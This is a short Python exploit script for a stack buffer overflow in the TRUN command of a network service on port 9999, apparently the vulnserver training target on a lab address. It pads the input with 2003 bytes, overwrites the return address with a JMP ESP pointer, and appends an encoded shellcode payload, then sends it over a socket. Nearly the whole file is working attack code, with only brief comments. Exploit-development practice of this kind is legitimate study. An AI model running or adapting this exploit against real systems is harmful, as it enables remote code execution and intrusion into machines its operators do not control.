#!/usr/bin/env python

import struct
import socket


host = "192.168.56.1"
port = 9999

ptr_jump_esp = 0x625011AF # Point to JMP ESP. Find this with !mona -s '\xff\xe4'

buf = "TRUN /.:/" # Initial command followed by buffer
buf += "A" * 2003

buf += struct.pack("<I", ptr_jump_esp) # Formatting memory address for Little Endian (x86)

buf += "\x83\xec\x10" # Move ESP up a bit in the stack to prevent shigata_na_gai from breaking it

buf += "\xda\xd8\xd9\x74\x24\xf4\xba\x6d\x91\xc4\x06\x5f\x2b" # Begin shellcode
buf += "\xc9\xb1\x31\x31\x57\x18\x83\xc7\x04\x03\x57\x79\x73"
buf += "\x31\xfa\x69\xf1\xba\x03\x69\x96\x33\xe6\x58\x96\x20"
buf += "\x62\xca\x26\x22\x26\xe6\xcd\x66\xd3\x7d\xa3\xae\xd4"
buf += "\x36\x0e\x89\xdb\xc7\x23\xe9\x7a\x4b\x3e\x3e\x5d\x72"
buf += "\xf1\x33\x9c\xb3\xec\xbe\xcc\x6c\x7a\x6c\xe1\x19\x36"
buf += "\xad\x8a\x51\xd6\xb5\x6f\x21\xd9\x94\x21\x3a\x80\x36"
buf += "\xc3\xef\xb8\x7e\xdb\xec\x85\xc9\x50\xc6\x72\xc8\xb0"
buf += "\x17\x7a\x67\xfd\x98\x89\x79\x39\x1e\x72\x0c\x33\x5d"
buf += "\x0f\x17\x80\x1c\xcb\x92\x13\x86\x98\x05\xf8\x37\x4c"
buf += "\xd3\x8b\x3b\x39\x97\xd4\x5f\xbc\x74\x6f\x5b\x35\x7b"
buf += "\xa0\xea\x0d\x58\x64\xb7\xd6\xc1\x3d\x1d\xb8\xfe\x5e"
buf += "\xfe\x65\x5b\x14\x12\x71\xd6\x77\x78\x84\x64\x02\xce"
buf += "\x86\x76\x0d\x7e\xef\x47\x86\x11\x68\x58\x4d\x56\x96"
buf += "\xba\x44\xa2\x3f\x63\x0d\x0f\x22\x94\xfb\x53\x5b\x17"
buf += "\x0e\x2b\x98\x07\x7b\x2e\xe4\x8f\x97\x42\x75\x7a\x98"
buf += "\xf1\x76\xaf\xfb\x94\xe4\x33\xd2\x33\x8d\xd6\x2a" #end shellcode

buf += "\n" #send newline

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #create socket
s.connect((host, port)) #connect to host
s.send(buf) #send buffer
s.close() #close cxn.
